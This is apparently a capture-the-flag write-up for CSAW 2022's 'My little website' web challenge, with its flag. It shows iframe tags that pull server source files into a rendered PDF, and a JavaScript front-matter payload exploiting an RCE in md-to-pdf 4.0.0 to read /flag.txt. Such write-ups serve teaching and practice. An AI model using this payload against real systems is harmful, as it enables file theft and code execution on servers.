`2022` `csaw` `web`

# My little website
`CTF{pdf_c0nt1nu3s_70_5uCK}`

_tl;dr_

LFI/RCE in `md-to-pdf` node module version `4.0.0`.
___

Used `iframes` to render the sources in the pdf

```
<iframe src="/"></iframe>
<iframe src="/index.js"></iframe>
<iframe src="/package.json"></iframe>
```

from which I learned that the submitted user-input was processed by `md-to-pdf` version `4.0.0` to create the pdf. This version is vulnerable to Javascript RCE (see [this issue](https://github.com/simonhaenisch/md-to-pdf/issues/99))

Payload to render the flag in the pdf:

```
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt').join()}"; display: block }`,
}
---
```